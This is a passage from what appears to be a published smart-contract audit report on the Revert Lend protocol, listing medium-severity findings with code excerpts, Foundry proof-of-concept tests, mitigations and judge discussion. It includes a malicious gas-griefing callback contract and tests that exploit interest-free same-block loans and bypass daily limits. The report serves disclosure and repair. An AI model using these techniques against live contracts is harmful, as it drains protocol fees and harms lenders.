Not sure how this should be fixed as the collateral tokens are configured separately and the collateral factors can differ. However, maybe preventing depositing and withdrawing in the same tx/small fee can help this.

Assessed type
Invalid Validation

kalinbas (Revert) acknowledged and commented:

The fact that AutoRange automator doesn’t work if the collateral limit is reached is no problem (this is as designed).
The fact that withdrawing lent assets can lead to collateral value > limit is no problem because it is limited to a certain percentage (it’s not possible to add a huge amount, borrow it, and withdraw it (because it is borrowed)).
[M-02] Protocol can be repeatedly gas griefed in AutoRange external call
Submitted by falconhoof, also found by ktg and novamanbg

Revert controlled AutoRange bot can be gas griefed and execute() reverted by malicious onERC721Received implementation

Vulnerability Details
The initiator of a transaction pays the transaction gas; in the case of AutoRange::execute() and AutoRange::executeWithVault(), this will be a Revert controlled bot which is set up as an operator. Newly minted NFTs are sent to users via NPM::safeTransferFrom() which uses the onERC721Received callback.

An attacker can implement a malicious implementation of this callback, by wasting all the transaction gas and reverting the function to grief the protocol. It is expected that the gas spent by bots initiating transactions will be covered by protocol fees; however, no protocol fees will be generated from the attacker’s position, as AutoRange::execute() will not complete; so the protocol will experience a loss.

Furthermore, once an attacker has set the token’s config from positionConfigs, the protocol has no way to stop the griefing occurring each time the bot detects that the tokenId meets the conditions for a Range Change. Token Config is only removed from positionConfigs at the end of execute(), which the gas grief will prevent from being reached making it a recurring attack. The only recourse to the protocol is shutting down the contract completely by removing the bot address as an operator and DOSing the contract.

All this makes the likelihood of this attack quite high as it is a very inexpensive attack; user does not even need an open position and loan in the vault. A determined attacker.

POC
An attacker would need to create a malicious contract to which they send their NPM NFT. Via this contract, they can then add token config for this NFT to the AutoRange contract via AutoRange::configToken(). The malicious contract would need to have a malicious implementation, such as the one below, which uses as much gas as possible before reverting.

    function onERC721Received(

        address operator,

        address from,

        uint256 tokenId,

        bytes calldata data

    ) external override returns (bytes4) {


    uint256 initialGas = gasleft();

    uint256 counter = 0;


    // Loop until only small amount gas is left for the revert

    uint256 remainingGasThreshold = 5000;


    while(gasleft() > remainingGasThreshold) {


        counter += 1;

    }


    // Explicitly revert transaction

    revert("Consumed the allotted gas");

        

    }
Impact
Protocol fees can be completely drained; particularly if a determined attacker sets token configs for multiple NFTs in AutoRange, all linked to the same malicious contract. Lack of fees can DOS multiple functions like the bot initiated AutoRange functions and affect the protocol’s profitability by draining fees.

Tools Used
Foundry Testing

Recommended Mitigation Steps
Enact a pull mechanism by transferring the newly minted NFT to a protocol owned contract, such as the AutoRange contract itself, from where the user initiates the transaction to transfer the NFT to themselves.

kalinbas (Revert) acknowledged and commented:

All these cases are possible but we are monitoring these off-chain bots and also implement gas-limiting, and taking action where needed.

ronnyx2017 (judge) decreased severity to Medium and commented:

valid gas grief, but not a persistent dos, so Medium.

falconhoof (warden) commented:

@ronnyx2017 - When a user adds their position’s config details via configToken(), the positionConfigs mapping is updated accordingly. From what I can see, there is no way to remove that config apart from at the end of execute().

Everytime the parameters defined in positionConfigs are met, the bot will call execute(), get griefed and user’s token config will remain in state. A malicious user can set up multiple positionConfigs to grief, with many different parameter trigger points, and the only recourse would be the shutting down of the AutoRange contract.

Once a new contract is set up of course the exact same thing can be done again, so I think it’s a strong case for a full DOS of this part of the protocol’s functionality and loss of funds for the protocol, which would be more than dust.

kalinbas (Revert) commented:

The logic which positions to execute is the responsibility of the bot. If there are worthless tokens detected or the tx simulation is not what expected the bot doesn’t execute the operation. So this is a risk which is controlled off-chain.

falconhoof (warden) commented:

How would that work? It doesn’t seem possible to foresee getting griefed, at least the first time and after that would the tokenId be blacklisted to prevent further griefing, which necessitates the shutting down of the contract?

Also, the mitigation of bots monitoring the contract is not documented under the list of known issues of the Contest’s README. I think it’s fair to flag this issue and leave up to the judge to decide if mitigation can be applied retrospectively after the audit.

ronnyx2017 (judge) commented:

I cannot understand what the warden is referring to with the “shutting down of the AutoRange contract”. There is no reason for the operator to waste gas on a transaction that continuously fails. Gas griefing is valid, and it will indeed continue to deplete the resources of the off-chain operator, but this does not constitute a substantial DoS. For predictions on any future actions/deployments, please refer to this org issue.

[M-03] No minLoanSize means liquidators will have no incentive to liquidate small positions
Submitted by falconhoof, also found by grearlake

No minLoanSize can destabilise the protocol.

Vulnerability Details
According to protocol team, they plan to roll out the protocol with minLoanSize = 0 and adjust that number if needs be. This can be a big issue because there will be no incentive for liquidators to liquidate small underwater positions given the gas cost. To do so would not make economic sense based on the incentive they would receive.

It also opens up a cheap attack path for would be attackers where they can borrow many small loans, which will go underwater as they accrue interest, but will not be liquidated.

Impact
Can push the entire protocol into an underwater state. Underwater debt would first be covered by Protocol reserves and where they aren’t sufficient, lenders will bear the responsibility of the uneconomical clean up of bad debt, so both the protocol and lenders stand to lose out.

Recommended Mitigation Steps
Close the vulnerability by implementing a realistic minLoanSize, which will incentivise liquidators to clean up bad debt.

kalinbas (Revert) acknowledged and commented:

Will do the deployment with a reasonable minLoanSize.

ronnyx2017 (judge) commented:

Normally, I would mark such issues as Low. But given that this issue provides a substantial reminder to the sponsor, I am retaining it as Medium.

[M-04] Due to interest rates update method, Interest-Free Loans are possible and the costs of DoS are reduced
Submitted by alix40, also found by 0xPhantom, Norah (1, 2), ktg, and lanrebayode77

Allowing in interest free debt in 1 block could have several unwanted results:

Allowing for in same block (not necessarily same transaction) interest-free loans, could be abused by wales for arbitrage operations, resulting in protocol users unable to borrow because of the daily limit.
DoS attacks, with the new updates on the main net resulting in way lower transaction fees, a whale account with a big position could borrow a big amount of money and then repay it in the same block; resulting in him not paying any interest, and users unable to borrow in this block. The attack will then be repeated in each block resulting in DoS.
The attack would result not only in DoS, but also the protocol Liquidity Providers (LPs), and the protocol would lose potential interest payments for their deposits.

Please also note, that in L2 blockchains, it is quite common for multiple L2 Blocks to have the same block.timestamp. So borrower could potentially have interest-free debt on the span of multiple blocks.

Proof of Concept
To prove the severance of the problems, we want to first demonstrate the math around the cost of a 24 hours DoS attack. Second, we want to demonstrate through a coded PoC, that when borrowing in the same block, there are no fees to be paid.

24 hours DoS costs:

Because the debt is interest free (see next step, for PoC) the cost of a 24 hours DoS attack is the cost of the gas to borrow and repay the loan. Due to the new changes deployed to Ethereum (Ethereum’s Dencun upgrade) the transactions fees on L2 like arbitrum, have massively decreased, resulting in a cost of around $0.1 per transaction. Right now on arbitrum, on average a block is minted each 15 seconds, resulting in 4 blocks per minute, 240 blocks per hour, and 5760 blocks per day. The cost of a single attack in a single block is (0.1 * 2) + 0.2 ~ 0.5 usd for the first borrow() to front run the other transactions in the block. The cost of a 24 hours DoS attack is then between 5760 * (0.1 * 2 + 0.2) =2304 usd and 5760 * (0.1 * 2 + 0.5)= 4032 usd. This would allow a whale whith a sufficient LP position that he can use as collateral for the 10% of the Lenders deposits (which is maximum daily borrowing limit). Specially in the early days of the protocol, this doesn’t necessary need to be a lot. A realistic scenario would look like this:

Total Users Deposits 10 million USDC.
Attacker has an LP position valued at 1.3 million USDC.
Daily borrowing limit is 10% of the total deposits, so 1 million USDC.
Attack Budget for attacker ~ 5000 USDC.
The attacker first borrows 1 million USDC at the start of the block (frontrun), and repay it in the same block (backrun); resulting in no interest to be paid and users unable to borrow in the same period.
The attacker goes on and repeats the attack repeatedly for 24 hours.
Proof that no fees are paid when borrowing and repaying in the same block:

It is intended by the protocol developers to only update interest rates once per block, and not for each transaction. This design choice could be shown in the _updateGlobalInterest() method:

function _updateGlobalInterest()

        internal

        returns (uint256 newDebtExchangeRateX96, uint256 newLendExchangeRateX96)

    {

        // only needs to be updated once per block (when needed)

        if (block.timestamp > lastExchangeRateUpdate) {

            (newDebtExchangeRateX96, newLendExchangeRateX96) = `_calculateGlobalInterest()`;

            lastDebtExchangeRateX96 = newDebtExchangeRateX96;

            lastLendExchangeRateX96 = newLendExchangeRateX96;

            lastExchangeRateUpdate = block.timestamp;

            emit ExchangeRateUpdate(newDebtExchangeRateX96, newLendExchangeRateX96);

        } else {

            newDebtExchangeRateX96 = lastDebtExchangeRateX96;

            newLendExchangeRateX96 = lastLendExchangeRateX96;

        }

    }
As we can see from the inline comment, it is the intention of the protocol developers to only update the interest rates once per block, and not for each transaction. To showcase that an interest free debt is possible in the same block, please add the following test to test/integration/V3Vault.t.sol:

    function testInterestFreeDebt() external {

        // @audit initialize Vault

        vm.startPrank(TEST_NFT_ACCOUNT_2);

        USDC.approve(address(vault), 10000000);

        vault.deposit(1000000, TEST_NFT_ACCOUNT_2);

        vm.stopPrank();

        // @audit PoC 

        vm.startPrank(TEST_NFT_ACCOUNT);

        NPM.approve(address(vault), TEST_NFT);

        vault.create(TEST_NFT,TEST_NFT_ACCOUNT);

        console.log("balance of user before borrow",USDC.balanceOf(TEST_NFT_ACCOUNT));

        vault.borrow(TEST_NFT, 100000);

        console.log("balance of user after borrow",USDC.balanceOf(TEST_NFT_ACCOUNT));

        USDC.approve(address(vault), 100000);

        vault.repay(TEST_NFT, 100000, false);

        console.log("balance of user after repay",USDC.balanceOf(TEST_NFT_ACCOUNT));

        // @audit assert that debt paid in full

        assertTrue(NPM.ownerOf(TEST_NFT)==TEST_NFT_ACCOUNT);

    }
Result:

Running 1 test for test/integration/V3Vault.t.sol:V3VaultIntegrationTest

[PASS] testInterestFreeDebt() (gas: 542028)

Logs:

  balance of user before borrow 0

  balance of user after borrow 100000

  balance of user after repay 0


Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 418.62ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests
Tools Used
Foundry

Recommended Mitigation Steps
The most simple solution to this issue, is to add a small borrow fee (percentagewise for e.g 0.1% of borrowed debt). This way even if arbitrageurs try to do swaps, or attackers try to DoS the system, Liquidity Providers will receive their fair yield (potentially a lot more yield if an attacker tries the DoS Attack described in this report).

Assessed type
Context

kalinbas (Revert) acknowledged and commented:

“Allowing for in same block (not necessarily same transaction) interest-free loans, could be abused by wales for arbitrage operations, resulting in protocol users unable to borrow because of the daily limit.”

If the whale borrow is repayed in the same block - the limit is reset. So other users can borrow in the next block.

About the DOS attack: There is a way to disable this attack by increasing the dailyLimitMinValue. The probability of someone attacking like this seems very low, so we are comfortable with this workaround.

ronnyx2017 (judge) decreased severity to Medium and commented:

I do not consider this to be a high issue; the first impact is false. Regarding the second, a DoS, the attacker would suffer huge losses without gaining anything.

But I still believe the issue is valid because MEV bots have enough incentive to hold debt from the vault over multiple blocks (one by one, borrow in the index 0 tx and repay in the last index tx), which could actually lead to a deterioration in the protocol’s reliability.

lanrebayode77 (warden) commented:

@ronnyx2017 - I think the severity of this should be reconsidered due to it impact.

Due to update mode, user can get loans without interest as long as repayment is done in the same transaction. This is the entire basis for Flashloan which also comes at a cost in popular lending platforms like AAVE and UNISWAP.

Since this action can be repeated overtime, protocol will be losing a lot as unclaimed interest fee, which would have made more funds to the LPs and protocol. Since loss of funds(fee) is evident, it’s valid as a high severity.

ronnyx2017 (judge) commented:

There is no technical disagreement, the attack you mentioned has already been described in my comments above, maintain Medium for cost and likelihood of attack.

[M-05] setReserveFactor fails to update global interest before updating reserve factor
Submitted by thank_you

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol?plain=1#L1167-L1195

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol?plain=1#L837-L840

Impact
When the vault owner calls V3Vault.setReserveFactor(), the function updates the reserve factor for the Vault. Unfortunately, if the global interest is not updated before the reserve factor is updated, the updated reserve factor will be retroactively applied in the exchange rate formula starting at the last update. This leads to unexpected lending rate changes causing lenders to receive unexpected more or less favorable lending exchange rate depending on what the updated reserve factor value is.

Proof of Concept
The lending rate formula is calculated _calculateGlobalInterest() and the formula can be defined as:

(uint256 borrowRateX96, uint256 supplyRateX96) = interestRateModel.getRatesPerSecondX96(available, debt);


supplyRateX96 = supplyRateX96.mulDiv(Q32 - reserveFactorX32, Q32);


// always growing or equal

uint256 lastRateUpdate = lastExchangeRateUpdate;


if (lastRateUpdate > 0) {

    newDebtExchangeRateX96 = oldDebtExchangeRateX96 + oldDebtExchangeRateX96 * (block.timestamp - lastRateUpdate) * borrowRateX96 / Q96;

    newLendExchangeRateX96 = oldLendExchangeRateX96 + oldLendExchangeRateX96 * (block.timestamp - lastRateUpdate) * supplyRateX96 / Q96;

} else {

    newDebtExchangeRateX96 = oldDebtExchangeRateX96;

    newLendExchangeRateX96 = oldLendExchangeRateX96;

}
In the formula above, the supply rate is modified before being used to calculate the new lending rate as supply rate * reserve factor. This modified supply rate is then used to determine how much of a jump should occur in the lending rate via newLendExchangeRateX96 = oldLendExchangeRateX96 + oldLendExchangeRateX96 * (block.timestamp - lastRateUpdate) * supplyRateX96 / Q96. The larger the modified supply rate, the larger the jump is. The smaller the modified supply rate, the smaller the jump is.

By not updating the lending rate before updating the reserve factor, the updated reserve factor will retroactively be applied to the past artificially influencing the lending rate.

To best visualize this, let’s look at the forge test below which shows two scenarios, one where the interest is updated before the reserve factor is updated and one where it’s not. Then we can compare the different lending rate values and see how by not updating the exchange rates before updating the reserve factor, the lending rate is impacted.

RESULTS FROM FORGE TESTS 


with interest rate update occurring after reserve factor update:


- starting lendExchangeRateX96:  79243018781103204090820932736

- after reserve update lendExchangeRateX96:  79240047527736122590199028736


with interest rate update occurring before reserve factor update:


- starting lendExchangeRateX96:  79243018781103204090820932736

- after reserve update lendExchangeRateX96:  79243018781103204090820932736
function testLendingRateReserveFactorBugWithoutInterestUpdate() external {

    vault.setLimits(1000000, 1000e18, 1000e18, 1000e18, 1000e18);


    // set up basic vault settings

    _deposit(10000000, WHALE_ACCOUNT);

    _setupBasicLoan(true);

    vm.warp(block.timestamp + 7 days);


    (,,,,,,uint lendExchangeRateX96) = vault.vaultInfo();

    console.log("old lendExchangeRateX96: ", lendExchangeRateX96);


    vm.prank(vault.owner());


    vault.setReserveFactor(uint32(Q32 / 5)); // 20% reserve factor


    // AUDIT: Calling setLimits updates the exchange rate

    vault.setLimits(1000000, 1000e18, 1000e18, 1000e18, 1000e18);



    (,,,,,,lendExchangeRateX96) = vault.vaultInfo();

    console.log("new lendExchangeRateX96: ", lendExchangeRateX96);

}


function testLendingRateReserveFactorBugWithInterestUpdate() external {

    vault.setLimits(1000000, 1000e18, 1000e18, 1000e18, 1000e18);


    // set up basic vault settings

    _deposit(10000000, WHALE_ACCOUNT);

    _setupBasicLoan(true);

    vm.warp(block.timestamp + 7 days);


    (,,,,,,uint lendExchangeRateX96) = vault.vaultInfo();

    console.log("old lendExchangeRateX96: ", lendExchangeRateX96);


    vm.prank(vault.owner());


    // AUDIT: Calling setLimits updates the exchange rate

    vault.setLimits(1000000, 1000e18, 1000e18, 1000e18, 1000e18);

    vault.setReserveFactor(uint32(Q32 / 5)); // 20% reserve factor


    (,,,,,,lendExchangeRateX96) = vault.vaultInfo();

    console.log("new lendExchangeRateX96: ", lendExchangeRateX96);

}
As you can see, by not updating the interest rate before updating the reserve factor, the lending rate will be impacted unfairly.

Recommended Mitigation Steps
Add _updateGlobalInterest() to the V3Vault.setReserveFactor() function before the reserve factor is updated. This ensures that the lending rate will not be artificially impacted and the updated reserve factor is not retroactively applied to the past:

function setReserveFactor(uint32 _reserveFactorX32) external onlyOwner {

    _updateGlobalInterest();

    reserveFactorX32 = _reserveFactorX32;

}
Assessed type
Math

kalinbas (Revert) confirmed

ronnyx2017 (judge) commented:

The losses are negligible, but it indeed breaks the math.

Revert mitigated:

Fixed here.

Status: Mitigation confirmed. Full details in reports from b0g0, thank_you and ktg.

[M-06] Users can lend and borrow above allowed limitations
Submitted by JohnSmith, also found by Arz, BowTiedOriole, FastChecker, shaka, Aymen0909, deepplus, KupiaSec, kennedy1030, kfx, and DanielArmstrong

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1250-L1251

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1262-L1263

Impact
Protocol design includes limitations on how much a user can deposit and borrow per day. So it is 10% of lent money or dailyLendIncreaseLimitMin/dailyDebtIncreaseLimitMin, whichever is greater. Current implementation is wrong and makes it 110% because of mistake in calculations; which means that users are able to deposit/borrow close to 110% amount of current assets.

Issue is in these calculations:

    uint256 lendIncreaseLimit = _convertToAssets(totalSupply(), newLendExchangeRateX96, Math.Rounding.Up)

                * (Q32 + MAX_DAILY_LEND_INCREASE_X32) / Q32;
            uint256 debtIncreaseLimit = _convertToAssets(totalSupply(), newLendExchangeRateX96, Math.Rounding.Up)

                * (Q32 + MAX_DAILY_DEBT_INCREASE_X32) / Q32;
Proof of Concept
For borrow I used function _setupBasicLoan() already implemented by you in your tests. Add this tests beside your other tests in test/integration/V3Vault.t.sol:

     function testDepositV2() external {

        vault.setLimits(0, 150000_000000, 0, 10_000000, 0);//10 usdc dailyLendIncreaseLimitMin

        uint256 balance = USDC.balanceOf(WHALE_ACCOUNT);


        vm.startPrank(WHALE_ACCOUNT);

        USDC.approve(address(vault), type(uint256).max);

        vault.deposit(10_000000 , WHALE_ACCOUNT);

        skip(1 days);

        for (uint i; i < 10; ++i) {

            uint256 assets = vault.totalAssets();

            console.log("USDC vault balance: %s", assets);

            uint amount = assets + assets * 9 / 100;// 109% 

            vault.deposit(amount, WHALE_ACCOUNT);

            skip(1 days);

        }

        uint256 assets = vault.totalAssets();

        assertEq(assets, 15902_406811);//so in 10 days we deposited 15k usdc, despite the 10 usdc daily limitation

        console.log("USDC balance: %s", assets); 

    }

    

    function testBorrowV2() external {

        vault.setLimits(0, 150_000000, 150_000000, 150_000000, 1_000000);// 1 usdc dailyDebtIncreaseLimitMin

        skip(1 days); //so we can recalculate debtIncreaseLimit again

        _setupBasicLoan(true);//borrow  8_847206 which is > 1_000000 and > 10% of USDC10_000000 in vault

    }
Recommended Mitigation Steps
Fix is simple for _resetDailyLendIncreaseLimit():

    uint256 lendIncreaseLimit = _convertToAssets(totalSupply(), newLendExchangeRateX96, Math.Rounding.Up)

-                * (Q32 + MAX_DAILY_LEND_INCREASE_X32) / Q32;

+                * MAX_DAILY_LEND_INCREASE_X32 / Q32;
And for _resetDailyDebtIncreaseLimit():

            uint256 debtIncreaseLimit = _convertToAssets(totalSupply(), newLendExchangeRateX96, Math.Rounding.Up)

-                * (Q32 + MAX_DAILY_DEBT_INCREASE_X32) / Q32;

+                * MAX_DAILY_DEBT_INCREASE_X32 / Q32;
Assessed type
Math

kalinbas (Revert) confirmed

Revert mitigated:

Fixed here.

Status: Mitigation confirmed. Full details in reports from thank_you, b0g0 and ktg.

[M-07] Large decimal of referenceToken causes overflow at oracle price calculation
Submitted by JecikPo, also found by linmiaomiao, kfx, KupiaSec, SpicyMeatball, kennedy1030, and t4sk

The price calculation at the V3Oracle.sol will revert upon reaching certain level when referenceToken is used with high decimal value (e.g. 18). The revert (specifically happening when calling getValue()) would make the Chainlink price feed useless; yet the TWAP price source would still be available. The protocol team would have to disable Chainlink and rely exclusively on the TWAP source reducing security of the pricing. The issue could manifest itself after certain amount of time once the project is already live and only when price returned by the feed reaches certain point.

Proof of Concept
The following code line has an issue:

chainlinkPriceX96 = (10 ** referenceTokenDecimals) * chainlinkPriceX96 * Q96 / chainlinkReferencePriceX96

                / (10 ** feedConfig.tokenDecimals);
When referenceTokenDecimals is 18, chainlinkPriceX96 is higher than some threshold between 18 and 19 (in Q96 notation), which will cause arithmetic overflow.

Recommended Mitigation Steps
Instead of calculating the price this way:

chainlinkPriceX96 = (10 ** referenceTokenDecimals) * chainlinkPriceX96 * Q96 / chainlinkReferencePriceX96

                / (10 ** feedConfig.tokenDecimals);
It could be done the following way as per Chainlink’s recommendation:

if (referenceTokenDecimals > feedConfig.tokenDecimals)

            chainlinkPriceX96 = (10 ** referenceTokenDecimals - feedConfig.tokenDecimals) * chainlinkPriceX96 * Q96 

            / chainlinkReferencePriceX96;

        else if (referenceTokenDecimals < feedConfig.tokenDecimals)

            chainlinkPriceX96 = chainlinkPriceX96 * Q96 / chainlinkReferencePriceX96 

            / (10 ** feedConfig.tokenDecimals - referenceTokenDecimals);

        else 

            chainlinkPriceX96 = chainlinkPriceX96 * Q96 / chainlinkReferencePriceX96;
Reference here.

Assessed type
Decimal

kalinbas (Revert) confirmed

Revert mitigated:

Fixed here.

Status: Mitigation confirmed. Full details in reports from ktg, thank_you and b0g0.

[M-08] DailyLendIncreaseLimitLeft and dailyDebtIncreaseLimitLeft are not adjusted accurately
Submitted by FastChecker, also found by DanielArmstrong

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L807-L949

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L807-L883

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L807-L1249

Vulnerability Details
When the V3Vault.sol#_withdraw and V3Vault.sol#_repay functions are called, dailyLendIncreaseLimitLeft and dailyDebtIncreaseLimitLeft are increased. However, if it is called before _withdraw and _repay are called, this increase becomes meaningless.

Impact
Even if the V3Vault.sol#_withdraw and V3Vault.sol#_repay functions are called, dailyLendIncreaseLimitLeft and dailyDebtIncreaseLimitLeft do not increase, so the protocol does not work as intended.

Proof of Concept
V3Vault.sol#_withdraw is as follows:

    function _withdraw(address receiver, address owner, uint256 amount, bool isShare)

        internal

        returns (uint256 assets, uint256 shares)

    {

        (uint256 newDebtExchangeRateX96, uint256 newLendExchangeRateX96) = _updateGlobalInterest();


        if (isShare) {

            shares = amount;

            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);

        } else {

            assets = amount;

            shares = _convertToShares(amount, newLendExchangeRateX96, Math.Rounding.Up);

        }


        // if caller has allowance for owners shares - may call withdraw

        if (msg.sender != owner) {

            _spendAllowance(owner, msg.sender, shares);

        }


        (, uint256 available,) = _getAvailableBalance(newDebtExchangeRateX96, newLendExchangeRateX96);

        if (available < assets) {

            revert InsufficientLiquidity();

        }


        // fails if not enough shares

        _burn(owner, shares);

        SafeERC20.safeTransfer(IERC20(asset), receiver, assets);


        // when amounts are withdrawn - they may be deposited again

949:    dailyLendIncreaseLimitLeft += assets;


        emit Withdraw(msg.sender, receiver, owner, assets, shares);

    }
As you can see, increase dailylendIncreaselimitLeft by the asset amount in L949. However, V3Vault.sol#_deposit is as follows:

    function _deposit(address receiver, uint256 amount, bool isShare, bytes memory permitData)

        internal

        returns (uint256 assets, uint256 shares)

    {

        (, uint256 newLendExchangeRateX96) = _updateGlobalInterest();


883:    _resetDailyLendIncreaseLimit(newLendExchangeRateX96, false);


        if (isShare) {

            shares = amount;

            assets = _convertToAssets(shares, newLendExchangeRateX96, Math.Rounding.Up);

        } else {

            assets = amount;

            shares = _convertToShares(assets, newLendExchangeRateX96, Math.Rounding.Down);

        }


        if (permitData.length > 0) {

            (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =

                abi.decode(permitData, (ISignatureTransfer.PermitTransferFrom, bytes));

            permit2.permitTransferFrom(

                permit, ISignatureTransfer.SignatureTransferDetails(address(this), assets), msg.sender, signature

            );

        } else {

            // fails if not enough token approved

            SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), assets);

        }


        _mint(receiver, shares);


        if (totalSupply() > globalLendLimit) {

            revert GlobalLendLimit();

        }


        if (assets > dailyLendIncreaseLimitLeft) {

            revert DailyLendIncreaseLimit();

        } else {

            dailyLendIncreaseLimitLeft -= assets;

        }


        emit Deposit(msg.sender, receiver, assets, shares);

    }
As you can see on the right, the dailyLendIncreaseLimitLeft function is called in L883. V3Vault.sol#_resetDailyLendIncreaseLimit is as follows:

    function _resetDailyLendIncreaseLimit(uint256 newLendExchangeRateX96, bool force) internal {

        // daily lend limit reset handling

        uint256 time = block.timestamp / 1 days;

1249:   if (force || time > dailyLendIncreaseLimitLastReset) {

            uint256 lendIncreaseLimit = _convertToAssets(totalSupply(), newLendExchangeRateX96, Math.Rounding.Up)

                * (Q32 + MAX_DAILY_LEND_INCREASE_X32) / Q32;

            dailyLendIncreaseLimitLeft =

                dailyLendIncreaseLimitMin > lendIncreaseLimit ? dailyLendIncreaseLimitMin : lendIncreaseLimit;

            dailyLendIncreaseLimitLastReset = time;

        }

    }
Looking at the function above, the increase of dailyLendIncreaseLimitLeft in the withdraw performed before depositing when a new day begins is not reflected in the dailyLendIncreaseLimitleft control by L1249. That is, the increase will not be reflected in the dailyLendIncreaseLimitLeft control. The same problem exists in the repay and borrow functions.

Recommended Mitigation Steps
VeVault.sol#_withdraw function is modified as follows:

    function _withdraw(address receiver, address owner, uint256 amount, bool isShare)

        internal

        returns (uint256 assets, uint256 shares)

    {

        (uint256 newDebtExchangeRateX96, uint256 newLendExchangeRateX96) = _updateGlobalInterest();

+       _resetDailyLendIncreaseLimit(newLendExchangeRateX96, false);


        if (isShare) {

            shares = amount;

            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);

        } else {

            assets = amount;

            shares = _convertToShares(amount, newLendExchangeRateX96, Math.Rounding.Up);

        }


        // if caller has allowance for owners shares - may call withdraw

        if (msg.sender != owner) {

            _spendAllowance(owner, msg.sender, shares);

        }


        (, uint256 available,) = _getAvailableBalance(newDebtExchangeRateX96, newLendExchangeRateX96);

        if (available < assets) {

            revert InsufficientLiquidity();

        }


        // fails if not enough shares

        _burn(owner, shares);

        SafeERC20.safeTransfer(IERC20(asset), receiver, assets);


        // when amounts are withdrawn - they may be deposited again

        dailyLendIncreaseLimitLeft += assets;


        emit Withdraw(msg.sender, receiver, owner, assets, shares);

    }
VeVault.sol#_repay function is modified as follows:

    function _repay(uint256 tokenId, uint256 amount, bool isShare, bytes memory permitData) internal {

        (uint256 newDebtExchangeRateX96, uint256 newLendExchangeRateX96) = _updateGlobalInterest();

+       _resetDailyLendIncreaseLimit(newLendExchangeRateX96, false);


        Loan storage loan = loans[tokenId];


        uint256 currentShares = loan.debtShares;


        uint256 shares;

        uint256 assets;


        if (isShare) {

            shares = amount;

            assets = _convertToAssets(amount, newDebtExchangeRateX96, Math.Rounding.Up);

        } else {

            assets = amount;

            shares = _convertToShares(amount, newDebtExchangeRateX96, Math.Rounding.Down);

        }


        // fails if too much repayed

        if (shares > currentShares) {

            revert RepayExceedsDebt();

        }


        if (assets > 0) {

            if (permitData.length > 0) {

                (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =

                    abi.decode(permitData, (ISignatureTransfer.PermitTransferFrom, bytes));

                permit2.permitTransferFrom(

                    permit, ISignatureTransfer.SignatureTransferDetails(address(this), assets), msg.sender, signature

                );

            } else {

                // fails if not enough token approved

                SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), assets);

            }

        }


        uint256 loanDebtShares = loan.debtShares - shares;

        loan.debtShares = loanDebtShares;

        debtSharesTotal -= shares;


        // when amounts are repayed - they maybe borrowed again

        dailyDebtIncreaseLimitLeft += assets;


        _updateAndCheckCollateral(

            tokenId, newDebtExchangeRateX96, newLendExchangeRateX96, loanDebtShares + shares, loanDebtShares

        );


        address owner = tokenOwner[tokenId];


        // if fully repayed

        if (currentShares == shares) {

            _cleanupLoan(tokenId, newDebtExchangeRateX96, newLendExchangeRateX96, owner);

        } else {

            // if resulting loan is too small - revert

            if (_convertToAssets(loanDebtShares, newDebtExchangeRateX96, Math.Rounding.Up) < minLoanSize) {

                revert MinLoanSize();

            }

        }


        emit Repay(tokenId, msg.sender, owner, assets, shares);

    }
kalinbas (Revert) confirmed

Revert mitigated:

Fixed here.

Status: Mitigation confirmed. Full details in reports from thank_you, b0g0 and ktg.

[M-09] Liquidation reward sent to msg.sender instead of recipient
Submitted by Giorgio, also found by thank_you

https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1078-L1080

Vulnerability details
When performing liquidation the liquidator will fill the LiquidateParams containing the liquidation details. The issue here is that instead of sending the liquidation rewards to the LiquidateParams.recipient, the rewards will be sent to msg.sender.

Impact
The liquidation rewards will be sent to msg.sender instead of the recipient, any external logic that relies on the fact that the liquidation rewards will be sent to recipient won’t hold; this will influence the protocol’s composability.

Proof of Concept
In order to keep the system safe the liquidator can and is incentivised to liquidate unhealthy positions. To do so the liquidate() function will be fired with the appropriate parameters. One of those parameters is the address recipient;; the name is quite intuitive for this one, this is where the liquidation rewards are expected to sent.

But if we follow the liquidation() function logic, the rewards will not be sent to recipient address. This piece of code handles the reward distribution.

(amount0, amount1) =

            _sendPositionValue(params.tokenId, state.liquidationValue, 

@>  state.fullValue, state.feeValue, msg.sender); 
We can see that msg.sender is being used instead of params.recipient.

Recommended Mitigation Steps
The mitigation is straight forward. Use params.recipient instead of msg.sender for that specific call.

     (amount0, amount1) =

            _sendPositionValue(params.tokenId, state.liquidationValue, 

 --    state.fullValue, state.feeValue, msg.sender); 

 ++    state.fullValue, state.feeValue, params.recipient); 
Assessed type
Context

kalinbas (Revert) confirmed

Revert mitigated:

Fixed here.

Status: Mitigation confirmed. Full details in reports from b0g0, thank_you and ktg.

[M-10] Users’s tokens stuck in AutoCompound after Vault is deactivated
Submitted by ktg

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/Automator.sol#L79-L82

https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/transformers/AutoCompound.sol#L201-L207

Proof of Concept
Contract AutoCompound inherits Automator contract and it contains a function allowing the owner to disable a vault:

function setVault(address _vault, bool _active) public onlyOwner {

        emit VaultChanged(_vault, _active);

        vaults[_vault] = _active;

    }
Unlike AutoExit and AutoRange in which disabling Vault has no effect, if vault is disabled in AutoCompound then user cannot withdraw their balances:

function withdrawLeftoverBalances(uint256 tokenId, address to) external nonReentrant {

        address owner = nonfungiblePositionManager.ownerOf(tokenId);

        if (vaults[owner]) {

            owner = IVault(owner).ownerOf(tokenId);

        }

        if (owner != msg.sender) {

